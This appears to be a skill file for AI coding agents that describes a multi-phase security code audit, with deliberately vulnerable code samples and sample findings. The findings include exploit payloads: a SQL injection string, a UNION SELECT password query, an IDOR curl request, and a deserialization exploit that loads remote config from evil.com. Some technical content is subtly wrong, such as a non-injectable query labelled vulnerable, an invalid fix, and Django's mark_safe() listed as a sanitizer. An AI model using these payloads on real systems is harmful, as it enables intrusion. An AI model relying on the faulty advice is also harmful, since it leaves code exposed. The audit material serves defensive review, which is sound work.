---
name: dfyx-code-security-auditor
description: Deep code security audit skill using white-box static analysis with 5-phase protocol covering 10 security dimensions across 9 languages
triggers:
  - "audit this code for security vulnerabilities"
  - "perform a security code review"
  - "scan for injection flaws and authentication issues"
  - "review code security using dfyx methodology"
  - "run deep security audit on this project"
  - "check for OWASP Top 10 vulnerabilities"
  - "analyze code for security weaknesses"
  - "conduct white-box security assessment"
---

# dfyx-code-security-auditor

> Skill by [ara.so](https://ara.so) — Security Skills collection.

Expert-level code security auditing based on deep data flow analysis and business logic understanding. Implements a standardized 5-phase white-box static analysis methodology to systematically discover and validate security vulnerabilities in source code.

## What This Skill Does

**dfyx_code_security_review** provides systematic code security auditing through:

- **Multi-language support**: Java, Python, Go, PHP, JavaScript/Node.js, C/C++, .NET/C#, Ruby, Rust
- **10 security dimensions**: Injection, Authentication, Authorization, Deserialization, File Operations, SSRF, Cryptography, Configuration, Business Logic, Supply Chain
- **3-track audit model**: Sink-driven (injections), Control-driven (authorization/logic), Config-driven (configurations)
- **5-phase protocol**: Reconnaissance → Pattern Matching → Taint Tracking → Validation → Reporting
- **Real-world case library**: Based on WooYun vulnerability cases (2010-2016)

## Installation

This skill is designed to be used within AI coding agents that support custom skills.

**For Claude Code:**
```bash
cd ~/.claude/skills/
git clone https://github.com/EastSword/skill-dfyx_code_security_review.git dfyx-code-security-auditor
```

**For Cursor/Windsurf:**
```bash
# Add to your .cursorrules or workspace configuration
# Copy the skill directory to your project's .ai/ folder
mkdir -p .ai/skills
git clone https://github.com/EastSword/skill-dfyx_code_security_review.git .ai/skills/dfyx-code-security-auditor
```

**Python Dependencies (for helper scripts):**
```bash
pip install -r requirements.txt
```

## Core Methodology

### 5-Phase Audit Protocol

```
Phase 1: Reconnaissance & Mapping (10%)
├─ Identify tech stack, frameworks, dependencies
├─ Map attack surface, entry points, data flows
└─ Output: Architecture diagram, attack surface inventory

Phase 2: Pattern Matching (30%)
├─ Parallel scanning across 10 dimensions
├─ Grep dangerous functions, missing controls
└─ Output: High-risk areas, candidate vulnerabilities

Phase 3: Deep Taint Tracking (40%)
├─ Trace data flows from sources to sinks
├─ Validate sanitization and security controls
└─ Output: Confirmed vulnerabilities with proof

Phase 4: Validation & Attack Chain (15%)
├─ Build exploit chains, test PoCs
├─ Cross-validate with multiple agents
└─ Output: Validated vulnerabilities with PoC

Phase 5: Structured Reporting (5%)
├─ Generate detailed reports
├─ Provide fix recommendations
└─ Output: Complete audit report
```

### 10 Security Dimensions

| Dimension | Coverage | Method |
|-----------|----------|--------|
| **D1: Injection** | SQL, Command, LDAP, SSTI, SpEL, JNDI | Sink-driven: Find dangerous functions → trace input |
| **D2: Authentication** | Token, Session, JWT, Filter chains | Config-driven: Check implementation completeness |
| **D3: Authorization** | CRUD permissions, IDOR, horizontal privilege escalation | Control-driven: Verify controls exist |
| **D4: Deserialization** | Java/Python/PHP gadget chains | Sink-driven: Find unserialize() → trace input |
| **D5: File Operations** | Upload, download, path traversal | Sink-driven: Find file ops → validate sanitization |
| **D6: SSRF** | URL injection, protocol restrictions | Sink-driven: Find HTTP clients → trace URLs |
| **D7: Cryptography** | Key management, cipher modes, KDF | Config-driven: Check crypto implementations |
| **D8: Configuration** | Debug endpoints, CORS, info disclosure | Config-driven: Scan config files |
| **D9: Business Logic** | Race conditions, mass assignment, state machines | Control-driven: Model workflows → find gaps |
| **D10: Supply Chain** | Dependency CVEs, version checks | Config-driven: Scan dependencies |

## Audit Modes

### Quick Mode (5-10 minutes)
```
Scope: Critical vulnerabilities, secrets, dependency CVEs
Use: CI/CD pipelines, small projects
Coverage: D1 (Injection), D10 (Supply Chain), Secret detection
```

### Standard Mode (30-60 minutes)
```
Scope: OWASP Top 10, auth/authz, crypto
Use: Regular audits, pre-deployment checks
Coverage: D1-D8
```

### Deep Mode (1-3 hours)
```
Scope: Full coverage, attack chains, business logic
Use: Major releases, penetration test prep
Coverage: D1-D10 + attack chain analysis
```

## Usage Patterns

### Basic Security Audit

**Trigger the audit:**
```
Audit this project for security vulnerabilities using deep mode
```

**Expected workflow:**
```
[MODE] deep
[RECON] Analyzing 874 files...
  Tech Stack: Spring Boot 1.5 + Apache Shiro 1.6 + JPA + Freemarker
  Entry Points: 43 REST endpoints, 12 template views
  Attack Surface: User input in 28 endpoints, file upload in 3

[PLAN] Deploying 5 parallel agents:
  Agent-D1: Injection vulnerabilities
  Agent-D234: Auth + Authz + Deserialization
  Agent-D567: File ops + SSRF + Crypto
  Agent-D89: Config + Business logic
  Agent-D10: Supply chain

Estimated: 125 turns, 90-120 minutes
Proceed? (yes/no)
```

### Language-Specific Patterns

#### Java/Spring Boot Audit

```java
// The skill will identify patterns like:

// VULNERABLE: SQL Injection
@GetMapping("/users")
public List<User> getUsers(@RequestParam String name) {
    String sql = "SELECT * FROM users WHERE name = '" + name + "'";
    return jdbcTemplate.query(sql, new UserRowMapper());
}

// VULNERABLE: Missing authorization
@GetMapping("/admin/users/{id}")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow();
    // No @PreAuthorize check
}

// VULNERABLE: Insecure deserialization
@PostMapping("/import")
public void importData(@RequestBody byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject(); // Dangerous!
}
```

**Audit command:**
```
Review this Spring Boot application for injection flaws, missing authorization checks, and unsafe deserialization
```

#### Python/Flask Audit

```python
# The skill will detect:

# VULNERABLE: Command injection
@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = os.system(f'ping -c 4 {host}')  # No sanitization
    return str(result)

# VULNERABLE: SQL injection
@app.route('/search')
def search():
    query = request.args.get('q')
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    return db.execute(sql).fetchall()

# VULNERABLE: Path traversal
@app.route('/download/<path:filename>')
def download(filename):
    return send_file(f'/uploads/{filename}')  # No path validation
```

**Audit command:**
```
Scan this Flask app for command injection and path traversal vulnerabilities
```

#### PHP/Laravel Audit

```php
// The skill will identify:

// VULNERABLE: SQL injection via raw queries
public function search(Request $request) {
    $keyword = $request->input('keyword');
    $users = DB::select("SELECT * FROM users WHERE name = '$keyword'");
    return view('results', ['users' => $users]);
}

// VULNERABLE: Mass assignment
public function updateProfile(Request $request) {
    $user = User::find($request->user_id);
    $user->update($request->all()); // Can modify is_admin, role, etc.
}

// VULNERABLE: Insecure file upload
public function upload(Request $request) {
    $file = $request->file('avatar');
    $path = $file->store('public/avatars'); // No type validation
}
```

**Audit command:**
```
Audit this Laravel application for SQL injection and mass assignment issues
```

#### JavaScript/Node.js Audit

```javascript
// The skill will detect:

// VULNERABLE: NoSQL injection
app.get('/login', async (req, res) => {
  const { username, password } = req.query;
  const user = await User.findOne({ 
    username: username, 
    password: password  // Can be {"$ne": null}
  });
});

// VULNERABLE: Command injection
app.post('/convert', (req, res) => {
  const { file } = req.body;
  exec(`convert ${file} output.png`, (err, stdout) => {
    res.send(stdout);
  });
});

// VULNERABLE: Prototype pollution
app.post('/merge', (req, res) => {
  const obj = {};
  merge(obj, req.body); // Can set __proto__
});
```

**Audit command:**
```
Check this Express app for NoSQL injection and prototype pollution
```

## Helper Scripts

### Pattern Scanner

```bash
# Scan for dangerous patterns
python scripts/pattern_scanner.py /path/to/project --language java --output patterns.json

# Focus on specific dimensions
python scripts/pattern_scanner.py /path/to/project --dimensions D1,D4,D5
```

### Data Flow Analyzer

```bash
# Trace data flows for specific sources
python scripts/data_flow_analyzer.py /path/to/project \
  --source "request.getParameter" \
  --sink "executeQuery"

# Output taint paths
python scripts/data_flow_analyzer.py /path/to/project \
  --output dataflow.json \
  --visualize
```

### Secret Finder

```bash
# Detect hardcoded secrets
python scripts/secret_finder.py /path/to/project

# Custom patterns
python scripts/secret_finder.py /path/to/project \
  --patterns custom_patterns.yaml \
  --entropy-threshold 4.5
```

### Dependency Analyzer

```bash
# Check for vulnerable dependencies
python scripts/dependency_analyzer.py /path/to/project

# Specific package managers
python scripts/dependency_analyzer.py /path/to/project \
  --package-manager maven,npm \
  --severity high,critical
```

### Full Audit with Report

```bash
# Complete audit pipeline
python scripts/code_scan.py /path/to/project \
  --mode deep \
  --output results.json

# Generate formatted report
python scripts/report_generator.py \
  --input results.json \
  --output audit_report.md \
  --template templates/report-templates/web-app-report-template.md
```

## Configuration

### Audit Configuration File

Create `.dfyx_audit.yaml` in your project root:

```yaml
# Audit configuration
mode: deep  # quick, standard, deep

# Scope
scope:
  include:
    - "src/**/*.java"
    - "controllers/**/*.py"
  exclude:
    - "test/**"
    - "vendor/**"
    - "node_modules/**"

# Dimensions to cover
dimensions:
  - D1  # Injection
  - D2  # Authentication
  - D3  # Authorization
  - D4  # Deserialization
  - D5  # File Operations
  - D6  # SSRF
  - D7  # Cryptography
  - D8  # Configuration
  - D9  # Business Logic
  - D10 # Supply Chain

# Sensitivity levels
severity_threshold: medium  # low, medium, high, critical

# Framework-specific settings
frameworks:
  spring:
    check_shiro_bypass: true
    check_spel_injection: true
  django:
    check_template_injection: true
    check_orm_injection: true

# Anti-hallucination settings
validation:
  require_evidence: true
  require_full_path: true
  require_poc: true  # For high/critical findings
  cross_validate: true  # Multi-agent validation

# Reporting
report:
  format: markdown  # markdown, json, html
  include_fix_examples: true
  include_attack_chains: true
  language: en  # en, zh
```

### Environment Variables

```bash
# For Docker-based verification
export DOCKER_HOST=unix:///var/run/docker.sock

# For dependency vulnerability scanning
export NVD_API_KEY=${NVD_API_KEY}  # NIST NVD API key
export GITHUB_TOKEN=${GITHUB_TOKEN}  # For GitHub Advisory Database

# For custom tool integration
export SEMGREP_RULES_PATH=/path/to/custom/rules
export CODEQL_DATABASE_PATH=/path/to/codeql/db
```

## Common Audit Scenarios

### Pre-commit Security Check

```bash
# Quick mode for fast feedback
python scripts/code_scan.py . --mode quick --staged-only

# In Git hooks (.git/hooks/pre-commit)
#!/bin/bash
python scripts/code_scan.py . --mode quick --fail-on critical,high
if [ $? -ne 0 ]; then
  echo "Security issues found. Commit aborted."
  exit 1
fi
```

### CI/CD Integration

```yaml
# .github/workflows/security-audit.yml
name: Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: pip install -r requirements.txt
      
      - name: Run security audit
        run: |
          python scripts/code_scan.py . \
            --mode standard \
            --output security_report.json \
            --fail-on critical
      
      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: security_report.json
```

### API Security Review

**User request:**
```
Review these API endpoints for authentication and authorization issues:

/api/v1/users/{id}
/api/v1/admin/settings
/api/v1/orders/{orderId}/cancel
```

**Skill workflow:**
1. Maps all endpoints and their HTTP methods
2. Checks for authentication filters/middleware
3. Validates authorization logic for each endpoint
4. Tests for IDOR and privilege escalation
5. Reports missing controls

### Database Layer Audit

**User request:**
```
Audit database queries for SQL injection in this repository
```

**Skill process:**
```
[Phase 1] Identifying database frameworks:
  - MyBatis 3.5.x (XML mappers + annotations)
  - JdbcTemplate (Spring)
  - Native JDBC in 3 files

[Phase 2] Pattern matching:
  - Found 45 parameterized queries (SAFE)
  - Found 8 string concatenations (REVIEW)
  - Found 2 dynamic ORDER BY (HIGH RISK)

[Phase 3] Taint analysis:
  File: UserMapper.xml:45
  Source: request.getParameter("sortBy")
  Path: controller → service → mapper
  Sink: ORDER BY ${sortBy}
  Sanitization: NONE
  Verdict: SQL INJECTION (Critical)
```

## Vulnerability Detection Examples

### Example 1: SQL Injection with Taint Tracking

**Code:**
```java
// UserController.java
@GetMapping("/search")
public List<User> search(@RequestParam String keyword) {
    return userService.searchByName(keyword);
}

// UserService.java
public List<User> searchByName(String name) {
    return userRepository.findByNameLike(name);
}

// UserRepository.java
@Query(value = "SELECT * FROM users WHERE name LIKE '%" + 
               ":name" + "%'", nativeQuery = true)
List<User> findByNameLike(@Param("name") String name);
```

**Audit output:**
```markdown
## [CRITICAL] SQL Injection in User Search

**Location:** `UserRepository.java:15`

**Data Flow:**
1. Source: `UserController.search()` - user input from `@RequestParam`
2. Propagation: `keyword` → `userService.searchByName(keyword)`
3. Sink: `@Query` with string concatenation in `findByNameLike()`

**Vulnerability:**
String concatenation in `@Query` bypasses parameter binding.

**Exploit:**
```
GET /search?keyword=admin'%20OR%20'1'='1
→ SELECT * FROM users WHERE name LIKE '%admin' OR '1'='1%'
```

**Fix:**
```java
@Query(value = "SELECT * FROM users WHERE name LIKE %:name%", nativeQuery = true)
List<User> findByNameLike(@Param("name") String name);
```
```

### Example 2: Missing Authorization Check

**Code:**
```python
@app.route('/api/orders/<int:order_id>', methods=['DELETE'])
@login_required
def cancel_order(order_id):
    order = Order.query.get_or_404(order_id)
    order.status = 'cancelled'
    db.session.commit()
    return {'message': 'Order cancelled'}
```

**Audit output:**
```markdown
## [HIGH] Horizontal Privilege Escalation - Missing Authorization

**Location:** `api/orders.py:45`

**Issue:**
Endpoint checks authentication (`@login_required`) but NOT authorization.
Any logged-in user can cancel ANY order.

**Attack:**
```bash
# User A (ID=10) cancels User B's order (ID=999)
curl -X DELETE https://api.example.com/api/orders/999 \
  -H "Authorization: Bearer <user_a_token>"
```

**Fix:**
```python
@app.route('/api/orders/<int:order_id>', methods=['DELETE'])
@login_required
def cancel_order(order_id):
    order = Order.query.get_or_404(order_id)
    
    # Authorization check
    if order.user_id != current_user.id:
        abort(403, "Not authorized to cancel this order")
    
    order.status = 'cancelled'
    db.session.commit()
    return {'message': 'Order cancelled'}
```
```

### Example 3: Unsafe Deserialization

**Code:**
```java
@PostMapping("/import")
public ResponseEntity<?> importData(@RequestBody String data) {
    try {
        byte[] bytes = Base64.getDecoder().decode(data);
        ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(bytes)
        );
        Object obj = ois.readObject();
        processImport(obj);
        return ResponseEntity.ok("Import successful");
    } catch (Exception e) {
        return ResponseEntity.badRequest().body(e.getMessage());
    }
}
```

**Audit output:**
```markdown
## [CRITICAL] Unsafe Deserialization → RCE

**Location:** `ImportController.java:23`

**Vulnerability:**
Deserializes untrusted user input without type validation.

**Gadget Chain (Spring Framework):**
```
org.springframework.context.support.FileSystemXmlApplicationContext
→ Load malicious XML config
→ Execute arbitrary code
```

**Exploit:**
```java
// Attacker creates malicious payload
FileSystemXmlApplicationContext ctx = 
    new FileSystemXmlApplicationContext("http://evil.com/exploit.xml");

byte[] payload = serialize(ctx);
String encoded = Base64.getEncoder().encodeToString(payload);

// Send to victim
POST /import
Content-Type: application/json

"<base64_payload>"
```

**Fix - Option 1 (Whitelist):**
```java
@PostMapping("/import")
public ResponseEntity<?> importData(@RequestBody String data) {
    try {
        ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(Base64.getDecoder().decode(data))
        ) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) 
                    throws IOException, ClassNotFoundException {
                if (!desc.getName().equals("com.example.ImportData")) {
                    throw new InvalidClassException("Unauthorized class");
                }
                return super.resolveClass(desc);
            }
        };
        // ...
```

**Fix - Option 2 (Use JSON):**
```java
@PostMapping("/import")
public ResponseEntity<?> importData(@RequestBody ImportDataDTO dto) {
    // Spring auto-deserializes from JSON (safe)
    processImport(dto);
    return ResponseEntity.ok("Import successful");
}
```
```

## Troubleshooting

### Issue: Too Many False Positives

**Solution:**
```yaml
# In .dfyx_audit.yaml
validation:
  require_evidence: true
  require_full_path: true
  require_poc: true
  cross_validate: true  # Enable multi-agent validation

# Also specify framework-aware sanitization
frameworks:
  spring:
    sanitizers:
      - "StringEscapeUtils.escapeSql"
      - "@Valid annotation"
  django:
    sanitizers:
      - "escape()"
      - "mark_safe()"
```

**Or in prompt:**
```
Audit this code but only report vulnerabilities with:
1. Complete taint paths from source to sink
2. Proof that no sanitization exists
3. Working PoC or exploit scenario
```

### Issue: Missing Framework-Specific Vulnerabilities

**Solution:**
```
The audit missed Shiro authentication bypass. Please:
1. Check for Shiro version < 1.7.0
2. Look for servlet patterns like /admin/* vs /admin/;/dashboard
3. Review FilterChainDefinition configurations
4. Test for path traversal in URL patterns
```

### Issue: Slow Audit Performance

**Solution:**
```bash
# Use quick mode for initial scan
python scripts/code_scan.py . --mode quick

# Then deep dive into high-risk areas
python scripts/code_scan.py src/controllers/ --mode deep --dimensions D1,D3

# Exclude third-party code
python scripts/code_scan.py . --exclude "vendor/**,node_modules/**"
```

### Issue: Need Custom Detection Rules

**Create custom rules:**
```yaml
# custom_rules.yaml
rules:
  - id: custom-ldap-injection
    pattern: |
      new InitialDirContext()
      ...
      .search($FILTER, ...)
    where:
      - $FILTER: user_controlled
    severity: high
    message: "Potential LDAP injection"
    
  - id: custom-jwt-alg-none
    pattern: |
      JWT.require(Algorithm.none())
    severity: critical
    message: "JWT algorithm 'none' allows signature bypass"
```

**Use in audit:**
```bash
python scripts/code_scan.py . --custom-rules custom_rules.yaml
```

## Advanced Features

### Attack Chain Analysis

**Trigger:**
```
Find attack chains that combine multiple vulnerabilities to achieve RCE
```

**Output example:**
```markdown
## Attack Chain: IDOR + SQL Injection → Data Exfiltration

**Chain:**
1. IDOR in `/api/users/{id}/profile` (Missing authz check)
2. SQL Injection in profile's `bio` field update
3. Stored XSS in profile view (inadequate encoding)

**Exploitation:**
```bash
# Step 1: Access admin profile via IDOR
GET /api/users/1/profile
→ Returns admin data

# Step 2: Inject SQL in bio field
PUT /api/users/1/profile
{"bio": "' UNION SELECT password FROM users--"}

# Step 3: Admin views their profile, sees all passwords
# Step 4: Stored XSS steals admin session
```

**Impact:** Complete account takeover + data breach
```

### Docker-Based Verification

**Enable PoC validation:**
```bash
# Skill will automatically:
# 1. Spin up Docker container with vulnerable code
# 2. Execute exploit
# 3. Verify success
# 4. Tear down container

python scripts/vulnerability_validator.py \
  --vulnerability-id V-2024-001 \
  --docker-verify \
  --container-timeout 300
```

### Compliance Mapping

**Map findings to frameworks:**
```
Generate audit report mapped to OWASP ASVS 4.0 and PCI DSS 4.0
```

**Output includes:**
```markdown
## Compliance Summary

| Finding | OWASP ASVS | PCI DSS | CWE |
|---------|------------|---------|-----|
| SQL Injection in login | V5.3.4 | 6.5.1 | CWE-89 |
| Missing authz in API | V4.1.3 | 6.5.8 | CWE-639 |
| Weak crypto (MD5) | V6.2.1 | 6.5.3 | CWE-327 |
```

## Best Practices

1. **Run audits early and often**
   - Quick mode in pre-commit hooks
   - Standard mode in CI/CD
   - Deep mode before releases

2. **Prioritize by exploitability**
   - Critical + easy to exploit → fix immediately
   - High + complex → schedule fix
   - Medium/Low → backlog

3. **Validate in staging**
   - Test PoCs in isolated environment
   - Verify fixes don't break functionality
   - Re-audit after fixes

4. **Maintain audit history**
   - Track findings over time
   - Measure remediation velocity
   - Identify recurring patterns

5. **Customize for your stack**
   - Add framework-specific rules
   - Define custom sanitizers
   - Build internal knowledge base

## References

- **Knowledge Base**: `resources/knowledge/` - 13 methodology documents
- **WooYun Cases**: `resources/wooyun/` - Real-world vulnerability examples
- **Detection Rules**: `resources/rules/` - Language-specific patterns
- **Report Templates**: `templates/report-templates/` - Standardized outputs
- **Example Audits**: `examples/` - Complete audit walkthroughs

---

**Security Notice:** This skill is for authorized security testing and code review only. Always obtain proper authorization before auditing code or systems you don't own.
